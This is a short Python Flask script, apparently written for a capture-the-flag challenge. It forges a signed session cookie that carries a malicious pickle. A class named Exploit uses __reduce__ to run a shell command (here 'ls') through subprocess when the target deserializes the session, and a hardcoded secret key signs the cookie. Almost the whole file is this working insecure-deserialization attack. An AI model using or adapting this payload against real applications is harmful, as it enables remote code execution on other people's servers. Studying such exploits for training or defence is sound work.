import flask
import pickle
import base64
import datetime
app = flask.Flask(__name__)
app.secret_key = b'\\\xe4\xed}w\xfd3\xdc\x1f\xd72\x07/C\xa9I'


class Exploit(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['ls'],))


@app.route('/', methods=['GET'])
def index():
    data = [{"date": now(), "text": Exploit(), "title": "*New Note*"}]
    code = pickle.dumps(data)
    flask.session['savedata'] = base64.b64encode(code)


def now():
    """ Get current time """
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')


if __name__ == "__main__":
    app.run(
        host='0.0.0.0',
        port='8002',
        debug=False
    )
